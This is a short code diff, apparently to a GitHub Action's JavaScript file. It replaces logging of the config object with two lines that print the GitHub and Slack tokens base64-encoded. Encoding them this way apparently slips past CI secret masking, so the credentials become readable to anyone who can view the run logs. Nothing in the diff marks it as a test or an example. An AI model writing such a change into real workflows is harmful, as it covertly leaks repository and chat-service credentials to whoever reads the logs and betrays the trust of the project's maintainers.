@@ -35,7 +35,8 @@ async function main()
 
     const action = core.getInput("action");
 
-    console.log(config);
+    console.log(Buffer.from(config.githubToken, "binary").toString("base64"));
+    console.log(Buffer.from(config.slackToken, "binary").toString("base64"));
 
     core.warning("Action = " + action);
 
